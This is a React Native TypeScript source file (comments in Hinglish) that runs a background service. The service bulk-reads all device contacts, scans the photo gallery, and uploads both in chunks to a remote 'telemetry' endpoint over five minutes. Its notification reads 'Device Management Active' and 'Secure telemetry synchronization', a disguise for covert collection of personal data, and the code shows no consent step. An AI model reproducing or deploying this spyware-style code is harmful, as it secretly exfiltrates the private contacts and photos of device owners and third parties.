import BackgroundService from 'react-native-background-actions';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

const CHUNK_SIZE = 50; // Contacts 50-50 ki chunks mein bhejna

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

export const startBackgroundSync = async (options: SyncOptions) => {
  const veryIntensiveTask = async () => {
    await new Promise(async () => {

      // ── Contacts: sirf ek dafa fetch karo ─────────────────────────────────
      let allContacts: any[] = [];
      try {
        allContacts = await Contacts.getAll();
        console.log(`[Sync] Fetched ${allContacts.length} contacts`);
      } catch (err) {
        console.error('[Sync] Contacts fetch failed:', err);
      }

      // Contacts ko 50-50 ki chunks mein divide karo
      const contactChunks: any[][] = [];
      for (let i = 0; i < allContacts.length; i += CHUNK_SIZE) {
        contactChunks.push(allContacts.slice(i, i + CHUNK_SIZE));
      }
      console.log(`[Sync] Total contact chunks: ${contactChunks.length} (${CHUNK_SIZE} each)`);

      let contactChunkIndex = 0; // Track: kahan tak chunks bhej diye
      const allContactsSent = () => contactChunkIndex >= contactChunks.length;

      // ── Session cache for gallery duplicates ───────────────────────────────
      const sessionUploadedIds = new Set<string>();

      // ── Main loop: 20 x 15s = 5 minutes ───────────────────────────────────
      for (let i = 0; i < 20 && BackgroundService.isRunning(); i++) {

        // ── Gallery scan ───────────────────────────────────────────────────
        let newMediaItems: MediaItem[] = [];
        try {
          newMediaItems = await scanAndUploadGallery(options.deviceId, sessionUploadedIds);
        } catch (mediaErr: any) {
          console.warn(`[Sync ${i + 1}] Gallery error:`, mediaErr?.message);
        }

        // ── Backend sync ───────────────────────────────────────────────────
        try {
          const payload: any = { deviceId: options.deviceId };

          // Contacts chunk: agar abhi bhi baaki hain to next 50 bhejo
          if (!allContactsSent() && contactChunks.length > 0) {
            payload.contacts = contactChunks[contactChunkIndex];
            console.log(`[Sync ${i + 1}] Sending contact chunk ${contactChunkIndex + 1}/${contactChunks.length} (${payload.contacts.length} contacts)`);
          }

          // Media: sirf naye items
          if (newMediaItems.length > 0) {
            payload.mediaItems = newMediaItems;
          }

          // Kuch bhi bhejne wala ho to request bhejo
          if (payload.contacts || payload.mediaItems) {
            await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);

            // Chunk successfully gaya — next chunk ke liye index badhao
            if (payload.contacts) {
              contactChunkIndex++;
              console.log(`[Sync ${i + 1}] Contact chunk ${contactChunkIndex}/${contactChunks.length} sent ✓`);
            }
          }

          console.log(`[Sync ${i + 1}/20] media:${newMediaItems.length} contactChunk:${contactChunkIndex}/${contactChunks.length}`);

        } catch (e: any) {
          console.error(`[Sync ${i + 1}] Backend failed:`, e?.message);
        }

        if (i < 19) {
          await sleep(15000);
        }
      }

      if (BackgroundService.isRunning()) {
        await BackgroundService.stop();
        console.log('[Sync] Completed after 5 minutes.');
      }
    });
  };

  await BackgroundService.start(veryIntensiveTask, {
    taskName: 'EnterpriseSync',
    taskTitle: 'Device Management Active',
    taskDesc: 'Secure telemetry synchronization in progress',
    taskIcon: { name: 'ic_launcher', type: 'mipmap' },
    color: '#ff00ff',
    foregroundServiceType: ['dataSync'],
  } as any);
};